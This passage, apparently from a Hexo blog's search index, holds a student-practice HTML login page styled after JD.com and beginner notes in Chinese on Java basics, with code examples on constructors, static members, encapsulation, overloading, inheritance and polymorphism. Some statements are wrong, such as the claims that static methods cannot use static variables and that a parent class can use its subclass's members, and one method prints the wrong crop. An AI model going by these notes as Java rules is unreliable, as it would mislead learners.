class="language-css">        }</span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">a</span><span class="selector-pseudo">:active</span>{</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: aquamarine;</span></span><br><span class="line"><span class="language-css">        }</span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">a</span><span class="selector-pseudo">:visited</span>{</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: yellow;</span></span><br><span class="line"><span class="language-css">        }</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--头部--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">header</span>&gt;</span><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"text1"</span>&gt;</span>欢迎登录<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">header</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--内容--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">article</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    框架--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"box"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"box_text1"</span>&gt;</span>京东会员<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"box_text2"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span>&gt;</span>立即注册<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"png/icon5.jpg"</span> <span class="attr">id</span>=<span class="string">"icon5"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"box3"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">action</span>=<span class="string">"success.html"</span>&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--    账号 text | 名字为 user | 默认值为 张三 | 尺寸size 为 20 | 提交长度上限 10  --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"png/icon1.jpg"</span> <span class="attr">class</span>=<span class="string">"icon1"</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"user"</span>  <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">size</span>=<span class="string">"20"</span> <span class="attr">maxlength</span>=<span class="string">"10"</span> <span class="attr">placeholder</span>=<span class="string">"邮箱/用户名/已验证手机"</span>  <span class="attr">class</span>=<span class="string">"box1"</span>/&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--    密码 password--&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"png/icon2.jpg"</span> <span class="attr">class</span>=<span class="string">"icon1"</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"password"</span>  <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">size</span>=<span class="string">"20"</span> <span class="attr">maxlength</span>=<span class="string">"10"</span> <span class="attr">class</span>=<span class="string">"box1"</span>/&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--                复选--&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">name</span>=<span class="string">"hobby"</span> /&gt;</span>自动登录<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"box3_text1"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span>&gt;</span>忘记密码?<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"box4"</span>&gt;</span><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"box3_text2"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span>&gt;</span>登录<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">article</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--底部--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">footer</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"text10"</span>&gt;</span>关于我们|练习我们|人才招聘|商家入驻|广告服务|手机京东|友情链接|销售联盟|京东社区|京东公益|English Site<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"text10"</span>&gt;</span>Copyrght <span class="symbol">&amp;copy;</span>2004-2017 京东JD.com 版权所有<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">footer</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> HTML </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JAVA基础概念</title>
      <link href="/NANABLOG/2023/12/11/java/"/>
      <url>/NANABLOG/2023/12/11/java/</url>
      
        <content type="html"><![CDATA[<h1 id="概念理解"><a href="#概念理解" class="headerlink" title="概念理解"></a>概念理解</h1><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a><strong>变量</strong></h2><p>可变的量、值，通常是数字(int,double)，小数(double)，整数(int)，字符串(String)，字符(char)。</p><h2 id="常量"><a href="#常量" class="headerlink" title="常量"></a><strong>常量</strong></h2><p>不可变的量，通常是一些常用的，比如一天24小时，1小时60分钟， 修饰符为 final。</p><h2 id="判断"><a href="#判断" class="headerlink" title="判断"></a><strong>判断</strong></h2><p>通过不同的条件语句进行对变量的判断，为true继续执行 为false结束执行。</p><h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a><strong>数组</strong></h2><p>用来存储一段数字 或者 字符串</p><h2 id="类"><a href="#类" class="headerlink" title="类"></a><strong>类</strong></h2><p>一种类型，比如跑车类，越野车类。</p><h2 id="包"><a href="#包" class="headerlink" title="包"></a><strong>包</strong></h2><p>一个归类的文件夹，在同一个包中，他们在同一个路径上，可以互相传递，倘若在不同包中，则需要其他方法进行链接和允许。</p><h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a><strong>方法</strong></h2><p>一个类中拥有，若干的方法，这是一种行为动作 其中main()方法作为程序执行的主入口。</p><h2 id="构建方法"><a href="#构建方法" class="headerlink" title="构建方法"></a><strong>构建方法</strong></h2><p>(快捷键: alt + ins:Constructor) </p><p>当New 对象的时候 会在类中执行 有参构造方法和无参构造方法</p><h2 id="属性"><a href="#属性" class="headerlink" title="属性"></a><strong>属性</strong></h2><p>一个类中拥有若干个属性，这是基础构成，特征。</p><h2 id="静态"><a href="#静态" class="headerlink" title="静态"></a><strong>静态</strong></h2><p>一个修饰符 被static关键词修饰后 这条语句或者变量会变成类变量或者类方法 静态关键词拥有先执行的特点  执行顺序为 静态&gt;构造方法&gt;main方法入口。</p><h2 id="封装"><a href="#封装" class="headerlink" title="封装"></a><strong>封装</strong></h2><p>(快捷键: alt + ins : Getter and Setter)</p><p>封装类后 属性会变为私有 只有当前类可调用 通过快捷键 alt + Ins 创建快速针对 属性的 set选择器方法 or get选择器方法 然后通过这两个方法去对属性做操作 在方法中可以在变量时针对做出不同条件做出限制。</p><h2 id="重载"><a href="#重载" class="headerlink" title="重载"></a><strong>重载</strong></h2><p>当一个类中 两个方法名重复 但参数类型不重复的时候 形成重载 这种情况遵循重载规则不会报错。</p><h2 id="修饰符"><a href="#修饰符" class="headerlink" title="修饰符"></a><strong>修饰符</strong></h2><p>不同的修饰符他对于环境的访问权限各不相同，他分为四项 默认修饰符 私有修饰符 公共修饰符 和一个针对外包不可访问的修饰符。</p><h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a><strong>继承</strong></h2><p>继承使用关键字 extends [类名]  继承一般是父级继承给子级，被继承后 子级可以使用父级的属性或方法。new 对象时 一般new 子级的类名 来运行  tip:如果是在不同包中的继承，在继承前需要导包 import.  通过点去点到你需要的包的文件 tip:继承具有唯一性单继承性和传承性（儿子可以用爸爸也可以用爷爷的属性和方法）</p><h2 id="重写"><a href="#重写" class="headerlink" title="重写"></a>重写</h2><p>(快捷键：alt + ins  :  Override Methods)</p><p>在原有方法的基础上 进行改进 在super() 后面进行续写 </p><h2 id="多态"><a href="#多态" class="headerlink" title="多态"></a><strong>多态</strong></h2><p>一个方法中要用到多个不同的对象（类）时，通过参数调用父级直接实现方法，称作多态（父类当做形参）、还有另一种多态是将父类作为返回值的方法，也可以实现多态。</p><p>tip:</p><p>1.从下向上转型可以直接转（低阶武者升级高阶武者可以顺其自然）</p><p>2.从上向下转型需要强转（高阶武者想要降级则要付出代价）</p><p>三个条件：</p><p>1、继承的存在（继承是多态的基础，没有基础就没有多态）。</p><p>2、子类重写父类的方法（多态下调用子类重写后的方法）。</p><p>3、父类引用变量指向子类对象（向上转型）。</p><h2 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h2><p>Alt + Ins  //快速创建 构造类</p><p>Ctrl + Alt + T  //调出所有的判断 循环 报错标准语句</p><h1 id="基础语句"><a href="#基础语句" class="headerlink" title="基础语句"></a>基础语句</h1><h2 id="构建一个方法"><a href="#构建一个方法" class="headerlink" title="构建一个方法"></a>构建一个方法</h2><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">//默认系统自带无参构造方法</span></span><br><span class="line">   <span class="comment">//快捷键生成构造方法 alt + Ins</span></span><br><span class="line">   <span class="comment">//构建了一个无参方法</span></span><br><span class="line">   <span class="keyword">public</span> <span class="title function_">Corn</span><span class="params">()</span> {</span><br><span class="line">   }</span><br><span class="line"></span><br><span class="line"><span class="comment">//构建了一个有参方法</span></span><br><span class="line">   <span class="keyword">public</span> <span class="title function_">Corn</span><span class="params">(String name, <span class="type">int</span> growTime, <span class="type">int</span> harvestTime, <span class="type">int</span> numsOfFruits, String status, <span class="type">double</span> harvestCost, <span class="type">boolean</span> isHarvested)</span> {</span><br><span class="line">       <span class="built_in">this</span>.name = name;</span><br><span class="line">       <span class="built_in">this</span>.growTime = growTime;</span><br><span class="line">       <span class="built_in">this</span>.harvestTime = harvestTime;</span><br><span class="line">       <span class="built_in">this</span>.numsOfFruits = numsOfFruits;</span><br><span class="line">       <span class="built_in">this</span>.status = status;</span><br><span class="line">       <span class="built_in">this</span>.harvestCost = harvestCost;</span><br><span class="line">       <span class="built_in">this</span>.isHarvested = isHarvested;</span><br><span class="line">   }</span><br><span class="line"></span><br><span class="line"><span class="comment">//类的属性</span></span><br><span class="line">   <span class="keyword">public</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">"玉米"</span>; <span class="comment">//名称</span></span><br><span class="line">   <span class="keyword">public</span> <span class="type">int</span> <span class="variable">growTime</span> <span class="operator">=</span> <span class="number">8</span>; <span class="comment">//生长期</span></span><br><span class="line">   <span class="keyword">public</span> <span class="type">int</span> <span class="variable">harvestTime</span> <span class="operator">=</span> <span class="number">3</span>; <span class="comment">//采摘期</span></span><br><span class="line">   <span class="keyword">public</span> <span class="type">int</span> <span class="variable">numsOfFruits</span> <span class="operator">=</span> <span class="number">200</span>; <span class="comment">//果实数量</span></span><br><span class="line">   <span class="keyword">public</span> <span class="type">String</span> <span class="variable">status</span> <span class="operator">=</span> <span class="string">"生长期"</span>; <span class="comment">// 生长状态</span></span><br><span class="line">   <span class="keyword">public</span> <span class="type">double</span> <span class="variable">harvestCost</span> <span class="operator">=</span> <span class="number">50</span>; <span class="comment">//收割费用</span></span><br><span class="line">   <span class="keyword">public</span> <span class="type">boolean</span> <span class="variable">isHarvested</span> <span class="operator">=</span> <span class="literal">false</span>; <span class="comment">//是否已采摘</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//类的方法（行为）</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">print</span><span class="params">()</span>{</span><br><span class="line">       System.out.println(<span class="string">"*******作物特性*******"</span>);</span><br><span class="line">       System.out.println(<span class="string">"您种植了:"</span> + <span class="built_in">this</span>.name + <span class="string">"。"</span>);</span><br><span class="line">       System.out.println(<span class="string">"生长日期:"</span> + <span class="built_in">this</span>.growTime + <span class="string">"。"</span>);</span><br><span class="line">       System.out.println(<span class="string">"采摘日期:"</span> + <span class="built_in">this</span>.harvestTime + <span class="string">"。"</span>);</span><br><span class="line">       System.out.println(<span class="string">"目前果实数量:"</span> + <span class="built_in">this</span>.numsOfFruits + <span class="string">"。"</span>);</span><br><span class="line">       System.out.println(<span class="string">"生长状态:"</span> + <span class="built_in">this</span>.status + <span class="string">"。"</span>);</span><br><span class="line">       System.out.println(<span class="string">"收割费用:"</span> + <span class="built_in">this</span>.harvestCost + <span class="string">"。"</span>);</span><br><span class="line">   }</span><br></pre></td></tr></tbody></table></figure><h2 id="静态-1"><a href="#静态-1" class="headerlink" title="静态"></a>静态</h2><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.dbqn.demo05;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> {</span><br><span class="line">    <span class="comment">//静态变量</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span>  String name;</span><br><span class="line">    <span class="comment">//实例变量</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="comment">//静态方法</span></span><br><span class="line">    <span class="comment">//静态方法中不可以调用实例方法</span></span><br><span class="line">    <span class="comment">//静态方法可以调用静态方法</span></span><br><span class="line">    <span class="comment">//静态方法不可以调用静态变量</span></span><br><span class="line">    <span class="comment">//静态方法不能使用 this</span></span><br><span class="line">    <span class="comment">//静态方法不能调用实例变量</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Print</span><span class="params">()</span>{}</span><br><span class="line">    <span class="comment">//实例方法</span></span><br><span class="line">    <span class="comment">//实例方法中可以调用静态方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">Print</span><span class="params">(<span class="type">int</span> age)</span>{}</span><br><span class="line"></span><br><span class="line">    <span class="comment">//静态代码块</span></span><br><span class="line">    <span class="keyword">static</span> { <span class="comment">// 当启动项加载时，会先执行静态代码块 如果执行顺序不对，可能是 new 对象的顺序不对</span></span><br><span class="line">        name = <span class="string">"小明"</span>;</span><br><span class="line">        <span class="comment">//静态代码块 只能给静态变量赋值</span></span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">//常量</span></span><br><span class="line">    <span class="comment">//常量一般用 静态关键词修饰</span></span><br><span class="line">    <span class="comment">//常量名字一般 大写</span></span><br><span class="line">    <span class="comment">//常量 要加关键字 final</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span>  <span class="type">double</span> <span class="variable">PI</span> <span class="operator">=</span> <span class="number">3.14</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="封装-1"><a href="#封装-1" class="headerlink" title="封装"></a>封装</h2><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.dbqn.demo03;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AppleTtee</span> {</span><br><span class="line"></span><br><span class="line">    <span class="comment">//封装</span></span><br><span class="line">    <span class="comment">//第一步 属性私有化</span></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span>  <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">private</span>  String date;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//第二步 构建方法 获取或者 改变属性 快捷键  alt + Ins</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> {</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> {</span><br><span class="line">        <span class="keyword">if</span> (name.equals(<span class="string">"苹果"</span>)){  <span class="comment">// 私有化的时候 如果是this.name 就会报错 所以必须直接写名字 进行判断</span></span><br><span class="line">            <span class="built_in">this</span>.name = name;</span><br><span class="line">        }<span class="keyword">else</span> {</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">"您输入的名字不合理"</span>); <span class="comment">// 报错语句</span></span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> {</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> {</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getDate</span><span class="params">()</span> {</span><br><span class="line">        <span class="keyword">return</span> date;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setDate</span><span class="params">(String date)</span> {</span><br><span class="line">        <span class="built_in">this</span>.date = date;</span><br><span class="line">    }</span><br><span class="line">    <span class="comment">//在 set 方法中添加控制语句，设定条件 在上述更改</span></span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="重载-1"><a href="#重载-1" class="headerlink" title="重载"></a>重载</h2><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.dbqn.demo06;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Pande</span> {</span><br><span class="line"> <span class="comment">// 重载</span></span><br><span class="line">    <span class="comment">//同一个类中 方法名相同 参数类型不同 1.参数数据类型不同 2.参数个数不同 3.顺序不同 和返回值无关</span></span><br><span class="line">    <span class="comment">//参数个数不同</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">print</span><span class="params">()</span>{}</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">print</span><span class="params">(String a)</span>{}</span><br><span class="line">    <span class="comment">//参数数据类型不同</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span>  <span class="title function_">print</span><span class="params">(<span class="type">int</span> a)</span>{}</span><br><span class="line">    <span class="comment">//顺序不同</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">print</span><span class="params">(<span class="type">int</span> a ,String b)</span>{}</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">print</span><span class="params">(String b, <span class="type">int</span> a)</span>{}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="继承-1"><a href="#继承-1" class="headerlink" title="继承"></a>继承</h2><p>注意点： 写父级的时候要写有参构造 否则 子级继承的时候回报错</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">package com.dbqn.demo06_继承;</span><br><span class="line"></span><br><span class="line">public class Corp {</span><br><span class="line">    //注意事项</span><br><span class="line">    //不能被继承</span><br><span class="line">    //1.当父类的属性或方法的修饰符是Priveate</span><br><span class="line">    //2.当父类的属性或方法的修饰符是默认的，且不再同一个包中</span><br><span class="line">    //3.构造方法不能被继承，但可以被使用</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    private String name; //名字</span><br><span class="line">    private  int growTime; //生长期</span><br><span class="line">    private  int harvestTime; //采摘期</span><br><span class="line">    private  int numsOfFruits; //果实数量</span><br><span class="line">    private  String status; //生长状态</span><br><span class="line">    private  boolean isHarvested; //是否采摘</span><br><span class="line"></span><br><span class="line">    //构造参数</span><br><span class="line">    //有参构造</span><br><span class="line">    public Corp(String name, int growTime, int harvestTime, int numsOfFruits, String status, boolean isHarvested) {</span><br><span class="line">        this.name = name;</span><br><span class="line">        this.growTime = growTime;</span><br><span class="line">        this.harvestTime = harvestTime;</span><br><span class="line">        this.numsOfFruits = numsOfFruits;</span><br><span class="line">        this.status = status;</span><br><span class="line">        this.isHarvested = isHarvested;</span><br><span class="line">    }</span><br><span class="line">    //无参构造</span><br><span class="line">    public Corp() {</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    //封装</span><br><span class="line">    public String getName() {</span><br><span class="line">        return name;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    public void setName(String name) {</span><br><span class="line">        this.name = name;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    public int getGrowTime() {</span><br><span class="line">        return growTime;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    public void setGrowTime(int growTime) {</span><br><span class="line">        this.growTime = growTime;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    public int getHarvestTime() {</span><br><span class="line">        return harvestTime;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    public void setHarvestTime(int harvestTime) {</span><br><span class="line">        this.harvestTime = harvestTime;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    public int getNumsOfFruits() {</span><br><span class="line">        return numsOfFruits;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    public void setNumsOfFruits(int numsOfFruits) {</span><br><span class="line">        this.numsOfFruits = numsOfFruits;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    public String getStatus() {</span><br><span class="line">        return status;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    public void setStatus(String status) {</span><br><span class="line">        this.status = status;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    public boolean isHarvested() {</span><br><span class="line">        return isHarvested;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    public void setHarvested(boolean harvested) {</span><br><span class="line">        isHarvested = harvested;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    //展示</span><br><span class="line">    public void print(){</span><br><span class="line">        System.out.println("*******作物特性*******");</span><br><span class="line">        System.out.println("您种植了:" + this.name + "。");</span><br><span class="line">        System.out.println("生长日期:" + this.growTime + "。");</span><br><span class="line">        System.out.println("采摘日期:" + this.harvestTime + "。");</span><br><span class="line">        System.out.println("目前果实数量:" + this.numsOfFruits + "。");</span><br><span class="line">        System.out.println("生长状态:" + this.status + "。");</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>tip:当子类继承了父类,它的构造方法会默认父类的无参构造，在调用父类的构造方法时，先进行属性的赋值</p><h2 id="多态-1"><a href="#多态-1" class="headerlink" title="多态"></a>多态</h2><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.dbqn.demo06_继承;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Land</span> {</span><br><span class="line">    <span class="comment">//判断土地是否被种植</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//种植苹果树</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">plant</span><span class="params">(AppleTree AppleTree)</span> {</span><br><span class="line">        <span class="keyword">if</span> (flag) {</span><br><span class="line">            System.out.println(<span class="string">"恭喜你，成功种植了苹果树"</span>);</span><br><span class="line">            AppleTree.print();</span><br><span class="line">            flag = <span class="literal">false</span>;</span><br><span class="line">        } <span class="keyword">else</span> {</span><br><span class="line">            System.out.println(<span class="string">"抱歉，该土地已经被种植"</span>);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">//种植玉米</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">plant</span><span class="params">(Corn Corn)</span> {</span><br><span class="line">        <span class="keyword">if</span> (flag) {</span><br><span class="line">            System.out.println(<span class="string">"恭喜你，成功种植了玉米"</span>);</span><br><span class="line">            Corn.print();</span><br><span class="line">            flag = <span class="literal">false</span>;</span><br><span class="line">        } <span class="keyword">else</span> {</span><br><span class="line">            System.out.println(<span class="string">"抱歉，该土地已经被种植"</span>);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">//种植西红柿</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">plant</span><span class="params">(Tomato Tomato)</span> {</span><br><span class="line">        <span class="keyword">if</span> (flag) {</span><br><span class="line">            System.out.println(<span class="string">"恭喜你，成功种植了玉米"</span>);</span><br><span class="line">            Tomato.print();</span><br><span class="line">            flag = <span class="literal">false</span>;</span><br><span class="line">        } <span class="keyword">else</span> {</span><br><span class="line">            System.out.println(<span class="string">"抱歉，该土地已经被种植"</span>);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">//在以下三种种植的时候，都是传入了子类的对象 以便可以引用 ，这种情况下有大量的重复性代码.</span></span><br><span class="line">    <span class="comment">//同一个方法中，用到不同的对象 ，简称为 多态</span></span><br><span class="line">    <span class="comment">//官方： 同一个方法中，不用的对象展现的方法，简称为 多态</span></span><br><span class="line">    <span class="comment">//所以直接传入父类对象作为参数 就可以简化代码 这被称之为多态</span></span><br><span class="line">    <span class="comment">//父类是也可以用子类的属性和方法的，他们是相同的</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">plant</span><span class="params">(Corp corp)</span> { <span class="comment">// new对象的时候直接New Corp也可以，因为子父类继承，构造方法也有子类的特殊属性的传递 所以不会报错</span></span><br><span class="line">        <span class="keyword">if</span> (flag) {</span><br><span class="line">            System.out.println(<span class="string">"恭喜你，成功种植了"</span> + corp.getName());</span><br><span class="line">            corp.print();</span><br><span class="line">            flag = <span class="literal">false</span>;</span><br><span class="line">        } <span class="keyword">else</span> {</span><br><span class="line">            System.out.println(<span class="string">"抱歉，该土地已经被种植"</span>);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    * 多态应用中(1.让父类作为形参传入方法)</span></span><br><span class="line"><span class="comment">    *向上转型(自动转化)</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>tip:这是以形参为父类的多态方法，以下是以返回值为父类的多态方法</p><h2 id="强制转换"><a href="#强制转换" class="headerlink" title="强制转换"></a>强制转换</h2><p>在Java中，强制类型转换（也称为类型转换或类型转换）是将一个数据类型的值转换为另一个数据类型的过程。这通常是因为你需要在不同的数据类型之间进行操作或赋值，但Java的类型系统要求你明确地告诉编译器你的意图，因为一些类型转换可能导致数据丢失或不可预测的结果。</p><p>要执行强制类型转换，你可以使用以下语法：</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">java复制代码目标数据类型 变量名 = (目标数据类型) 原始数据;</span><br></pre></td></tr></tbody></table></figure><p>这是一个简单的示例，演示如何将一个整数转换为浮点数：</p><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">intValue</span> <span class="operator">=</span> <span class="number">42</span>;</span><br><span class="line"><span class="type">double</span> <span class="variable">doubleValue</span> <span class="operator">=</span> (<span class="type">double</span>) intValue;</span><br></pre></td></tr></tbody></table></figure><p>在这个示例中，<code>(double)</code> 是强制类型转换操作符，它告诉编译器将整数值 <code>intValue</code> 转换为双精度浮点数，并将结果存储在 <code>doubleValue</code> 